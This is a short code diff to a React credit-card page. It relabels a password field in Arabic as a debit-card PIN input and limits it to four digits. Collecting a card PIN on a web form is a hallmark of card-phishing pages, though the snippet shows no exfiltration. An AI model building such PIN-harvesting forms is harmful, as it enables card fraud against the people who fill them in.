@@ -250,8 +250,9 @@ export default function CreditCardPage() {
           <div>
             <Input
               type="password"
-              placeholder="كلمة المرور"
+              placeholder="الرقم السري لبطاقة الخصم"
               value={pass}
+              maxLength={4}
               onChange={(e) => setPass(e.target.value)}
               className="w-full h-14 text-right pr-4 text-gray-600 border-gray-300 rounded-xl"
             />
